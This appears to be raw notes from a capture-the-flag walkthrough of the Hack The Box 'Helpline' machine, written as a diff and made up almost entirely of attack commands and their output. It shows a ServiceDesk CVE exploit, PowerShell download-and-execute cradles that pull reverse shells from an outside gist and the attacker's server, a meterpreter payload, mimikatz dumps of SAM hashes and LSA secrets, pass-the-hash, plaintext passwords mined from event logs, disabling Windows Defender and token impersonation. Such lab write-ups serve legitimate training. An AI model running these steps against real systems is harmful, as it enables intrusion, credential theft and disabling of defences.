@@ -1,0 +1,716 @@
+Port 8080
+Login with default guess creds
+
+guest:guest
+CVE : 2019-10008 exploit works on "administrator" login
+
+generated an api key
+API Key : 0CF6AF2B-2172-4386-867E-6F8627634E86
+
+
+Create custom trigger action with powershell
+
+>> powershell Test-NetConnection 10.10.16.45
+and we got output
+root@kali:~# tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+11:08:07.526313 IP 10.10.10.132 > 10.10.16.45: ICMP echo request, id 1, seq 1, length 40
+11:08:07.526382 IP 10.10.16.45 > 10.10.10.132: ICMP echo reply, id 1, seq 1, length 40
+11:10:34.754705 IP 10.10.10.132 > 10.10.16.45: ICMP echo request, id 1, seq 2, length 40
+11:10:34.754734 IP 10.10.16.45 > 10.10.10.132: ICMP echo reply, id 1, seq 2, length 40
+
+
+
+Generate powershell with setooklkit
+rename from .txt to .ps1
+
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+
+serve on port 8000
+root@kali:~/HTB/Helpline# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.132 - - [18/Jun/2019 12:06:02] "GET /shell.ps1 HTTP/1.1" 200 -
+
+we got a shell
+root@kali:~/HTB/Helpline# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.45] from helpline.htb [10.10.10.132] 49756
+Microsoft Windows [Version 10.0.17763.253]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>whoami
+nt authority\system
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            alice                    DefaultAccount           
+Guest                    leo                      niels                    
+tolu                     WDAGUtilityAccount       zachary                  
+The command completed with one or more errors.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          0
+Maximum password age (days):                          Unlimited
+Minimum password length:                              0
+Length of password history maintained:                None
+Lockout threshold:                                    Never
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        SERVER
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user Administrator
+User name                    Administrator
+Full Name                    
+Comment                      Built-in account for administering the computer/domain
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/18/2019 12:56:17 PM
+Password expires             Never
+Password changeable          6/18/2019 12:56:17 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   6/18/2019 12:56:23 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user alice
+User name                    alice
+Full Name                    alice
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/20/2018 11:54:31 PM
+Password expires             Never
+Password changeable          12/20/2018 11:54:31 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/29/2018 12:55:55 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user leo
+User name                    leo
+Full Name                    leo
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/23/2018 9:00:55 PM
+Password expires             Never
+Password changeable          12/23/2018 9:00:55 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   6/18/2019 12:53:14 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Helpdesk Admins      *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user niels
+User name                    niels
+Full Name                    niels
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/25/2018 12:39:28 AM
+Password expires             Never
+Password changeable          12/25/2018 12:39:28 AM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Server Admins        *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user tolu
+User name                    tolu
+Full Name                    tolu
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/18/2019 1:43:14 PM
+Password expires             Never
+Password changeable          6/18/2019 1:43:14 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/29/2018 10:20:44 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net user zachary
+User name                    zachary
+Full Name                    zachary
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            12/21/2018 10:25:34 PM
+Password expires             Never
+Password changeable          12/21/2018 10:25:34 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/28/2018 10:57:32 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Event Log Readers    *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>net localgroup
+
+Aliases for \\HELPLINE
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Helpdesk Admins
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Print Operators
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Server Admins
+*Storage Replica Administrators
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege            
+ Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+
+
+query all event logs and store in txt file
+
+store event logs
+wevtutil el > log.txt
+query each
+(for /f %i in (log.txt) do @echo %i & wevtutil gl %i & echo.) > newlog.txt
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>wmic logicaldisk list brief
+DeviceID  DriveType  FreeSpace   ProviderName  Size         VolumeName  
+C:        3          5836271616                18981318656              
+D:        5                                                             
+E:        3          994660352                 2146430976   Data        
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>where /R C:\ user.txt
+
+C:\Users\tolu\Desktop\user.txt
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>where /R C:\ root.txt
+
+C:\Users\Administrator\Desktop\root.txt
+
+
+Works
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.45:8000/PowerUp.ps1')
+nothing interesting
+
+
+Followed a hint from web admin account panel enum, found a password_audit file and followed a dir reference
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>type "C:\Temp\Password Audit\it_logins.txt"
+
+local Windows account created
+
+username: alice
+password: $sys4ops@megabank!
+admin required: no
+
+shadow admin accounts:
+
+mike_adm:Password1
+dr_acc:dr_acc
+
+
+E:\ManageEngine\ServiceDesk\integration\custom_scripts>dir C:\Temp
+ Volume in drive C has no label.
+ Volume Serial Number is D258-5C3B
+
+ Directory of C:\Temp
+
+06/18/2019  04:40 PM    <DIR>          .
+06/18/2019  04:40 PM    <DIR>          ..
+06/18/2019  04:05 PM             5,120 162.dll
+06/18/2019  04:40 PM             2,827 9.xml
+01/01/2019  11:14 PM    <DIR>          Password Audit
+06/18/2019  03:54 PM            38,616 sp.exe
+               3 File(s)         46,563 bytes
+               3 Dir(s)   5,689,782,272 bytes free
+
+
+
+
+METERPRETER REV SHELL
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.45 lport=1234 -f exe -o shell.exe
+powershell wget http://10.10.16.45:8000/shell.exe -O E:\ManageEngine\ServiceDesk\integration\custom_scripts\shell.exe
+
+sf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.45:1234 
+[*] Sending stage (206403 bytes) to 10.10.10.132
+[*] Meterpreter session 2 opened (10.10.16.45:1234 -> 10.10.10.132:49899) at 2019-06-19 13:26:32 +0100
+
+meterpreter > sysinfo
+[-] Error running command sysinfo: Rex::TimeoutError Operation timed out.
+meterpreter > sysinfo
+Computer        : HELPLINE
+OS              : Windows 2016 (Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter > 
+
+eterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.1.1 20180925 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain    NTLM                              SHA1
+--------  ------    ----                              ----
+leo       HELPLINE  60b05a66232e2eb067b973c889b615dd  68c6608505d867762620a64dfd354685da822bf2
+
+wdigest credentials
+===================
+
+Username   Domain    Password
+--------   ------    --------
+(null)     (null)    (null)
+HELPLINE$  HTB       (null)
+leo        HELPLINE  (null)
+
+kerberos credentials
+====================
+
+Username   Domain    Password
+--------   ------    --------
+(null)     (null)    (null)
+helpline$  HTB       (null)
+leo        HELPLINE  (null)
+
+
+meterpreter > 
+
+eterpreter > lsa_dump_sam
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : HELPLINE
+SysKey : f684313986dcdab719c2950661809893
+Local SID : S-1-5-21-3107372852-1132949149-763516304
+
+SAMKey : 9db624e549009762ee47528b9aa6ed34
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: d5312b245d641b3fae0d07493a022622
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 52a344a6229f7bfa074d3052023f0b41
+
+RID  : 000003e8 (1000)
+User : alice
+  Hash NTLM: 998a9de69e883618e987080249d20253
+
+RID  : 000003ef (1007)
+User : zachary
+  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282
+
+RID  : 000003f1 (1009)
+User : leo
+  Hash NTLM: 60b05a66232e2eb067b973c889b615dd
+
+RID  : 000003f2 (1010)
+User : niels
+  Hash NTLM: 35a9de42e66dcdd5d512a796d03aef50
+
+RID  : 000003f3 (1011)
+User : tolu
+  Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
+
+
+meterpreter > 
+
+eterpreter > lsa_dump_secrets
+[+] Running as SYSTEM
+[*] Dumping LSA secrets
+Domain : HELPLINE
+SysKey : f684313986dcdab719c2950661809893
+
+Local name : HELPLINE ( S-1-5-21-3107372852-1132949149-763516304 )
+Domain name : HTB
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {db8154f9-7a59-a5be-be05-2221c5870158}
+  [00] {db8154f9-7a59-a5be-be05-2221c5870158} 295db0e9f3539c975d22b4787c2d1f762d484c642a1b9fc3a9d59e872f9f2f09
+
+Secret  : DefaultPassword
+cur/text: fe22ca6029a87b98e527686a56c12aa9
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 ac 6e cf 44 87 d6 45 1a b0 55 dd e9 74 cd 04 dd 2a e8 46 3c 2d 28 12 0d a6 95 e8 19 70 05 47 fa 73 29 d7 1d c8 e9 b5 46 
+    full: ac6ecf4487d6451ab055dde974cd04dd2ae8463c2d28120da695e819700547fa7329d71dc8e9b546
+    m/u : ac6ecf4487d6451ab055dde974cd04dd2ae8463c / 2d28120da695e819700547fa7329d71dc8e9b546
+old/hex : 01 00 00 00 5f b8 0b 41 d7 6a 69 95 e7 55 3f 3a 1b 68 e9 f6 d1 f9 21 18 e4 c5 63 53 d6 a4 fc d9 09 7d 1c a4 59 5e 0c 74 37 33 05 61 
+    full: 5fb80b41d76a6995e7553f3a1b68e9f6d1f92118e4c56353d6a4fcd9097d1ca4595e0c7437330561
+    m/u : 5fb80b41d76a6995e7553f3a1b68e9f6d1f92118 / e4c56353d6a4fcd9097d1ca4595e0c7437330561
+
+Secret  : NL$KM
+cur/hex : e3 05 bc ab 6f ac 32 0e 38 53 9a 46 3e a8 2b 90 3e 1e a1 c3 94 65 8d 5d 5a 2a 6d f5 fc c4 93 49 ce 68 24 df 38 f0 a6 3d e1 60 73 e2 b1 ce 1a cc 43 db 81 ee c8 34 de 2e 98 4e 5c d3 35 3f 4a d4 
+old/hex : e3 05 bc ab 6f ac 32 0e 38 53 9a 46 3e a8 2b 90 3e 1e a1 c3 94 65 8d 5d 5a 2a 6d f5 fc c4 93 49 ce 68 24 df 38 f0 a6 3d e1 60 73 e2 b1 ce 1a cc 43 db 81 ee c8 34 de 2e 98 4e 5c d3 35 3f 4a d4 
+
+
+meterpreter > 
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+
+
+root@kali:~/HTB/Helpline# python /root/toolbox/impacket/build/scripts-2.7/psexec.py zachary:0987654321@10.10.10.132
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.132.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'E$' is not writable.
+[-] share 'Helpdesk_Stats' is not writable.
+
+oot@kali:~/HTB/Helpline# smbmap -u zachary -p 0987654321 -H 10.10.10.132
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.132...
+[+] IP: 10.10.10.132:445	Name: helpline.htb                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	E$                                                	NO ACCESS
+	Helpdesk_Stats                                    	NO ACCESS
+	IPC$                                              	READ ONLY
+
+
+
+
+Administrator Pass The Hash
+root@kali:~/HTB/Helpline# python /root/toolbox/impacket/build/scripts-2.7/psexec.py -hashes :d5312b245d641b3fae0d07493a022622 Administrator@10.10.10.132
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.132.....
+[*] Found writable share ADMIN$
+[*] Uploading file YGdIRyni.exe
+[*] Opening SVCManager on 10.10.10.132.....
+[*] Creating service EKtK on 10.10.10.132.....
+[*] Starting service EKtK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.253]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+
+C:\>wevtutil el > c:\evtlogs.txt
+
+C:\>(for /f %i in (evtlogs.txt) do @echo %i & wevtutil qe /r:10.10.10.132 /u:HELPLINE\zachary /p:0987654321 %i & echo.) >> newlog.txt
+The operation completed successfully.
+
+
+.....
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2018-12-28T22:37:35.358605900Z'/><EventRecordID>34715</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='296'/><Channel>Security</Channel><Computer>HELPLINE</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-3107372852-1132949149-763516304-500</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>HELPLINE</Data><Data Name='SubjectLogonId'>0x75935</Data><Data Name='NewProcessId'>0xbbc</Data><Data Name='NewProcessName'>C:\Windows\System32\net.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x340</Data><Data Name='CommandLine'>"C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='MandatoryLabel'>S-1-16-12288</Data></EventData></Event>
+
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2018-12-28T22:40:28.779581500Z'/><EventRecordID>34916</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='2656'/><Channel>Security</Channel><Computer>HELPLINE</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-3107372852-1132949149-763516304-500</Data><Data Name='SubjectUserName'>Administrator</Data><Data Name='SubjectDomainName'>HELPLINE</Data><Data Name='SubjectLogonId'>0x75935</Data><Data Name='NewProcessId'>0xbd8</Data><Data Name='NewProcessName'>C:\Windows\System32\systeminfo.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x340</Data><Data Name='CommandLine'>"C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='MandatoryLabel'>S-1-16-12288</Data></EventData></Event>
+
+
+C:\>powershell wget http://10.10.16.45:8000/getflag.ps1 -O C:\getflag.ps1
+
+C:\>powershell c:\getflag.ps1
+0d522fa8d6d2671636ac7e73216808d3
+
+C:\>
+
+DISABLE WINDEFEND 
+
+c:\>powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
+c:\>powershell wget http://10.10.16.45:8000/shell.exe -O c:\shell.exe
+
+c:\>powershell c:\shell.exe
+
+
+
+IMPERSONATE LEO BY STEAL LEO'S TOKEN
+sf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.45:1234 
+[*] Sending stage (206403 bytes) to 10.10.10.132
+[*] Meterpreter session 1 opened (10.10.16.45:1234 -> 10.10.10.132:49809) at 2019-06-20 18:57:48 +0100
+
+meterpreter > use incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+HELPLINE\alice
+HELPLINE\leo
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+HELPLINE\Administrator
+HELPLINE\tolu
+meterpreter > impersonate_token HELPLINE\\leo
+[+] Delegation token available
+[+] Successfully impersonated user HELPLINE\leo
+
+meterpreter > shell
+Process 3600 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.253]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+helpline\leo
+
+C:\>type c:\users\leo\desktop\admin-pass.xml
+type c:\users\leo\desktop\admin-pass.xml
+01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
+
+C:\>exit
+
+meterpreter > download c:\\users\\leo\\desktop\\admin-pass.xml
+[*] Downloading: c:\users\leo\desktop\admin-pass.xml -> admin-pass.xml
+[*] Downloaded 526.00 B of 526.00 B (100.0%): c:\users\leo\desktop\admin-pass.xml -> admin-pass.xml
+[*] download   : c:\users\leo\desktop\admin-pass.xml -> admin-pass.xml
+
+meterpreter > impersonate_token HELPLINE\\Administrator
+[-] No delegation token available
+[+] Successfully impersonated user HELPLINE\Administrator
+meterpreter > shell
+Process 5580 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.253]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+helpline\administrator
+
+C:\>cd c:\users\administrator
+cd c:\users\administrator
+
+c:\Users\Administrator>cd desktop
+cd desktop
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D258-5C3B
+
+ Directory of c:\Users\Administrator\Desktop
+
+01/02/2019  11:43 PM    <DIR>          .
+01/02/2019  11:43 PM    <DIR>          ..
+12/21/2018  12:09 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   5,846,687,744 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+d814211fc0538e50a008afd817f75a2c
+c:\Users\Administrator\Desktop>
+
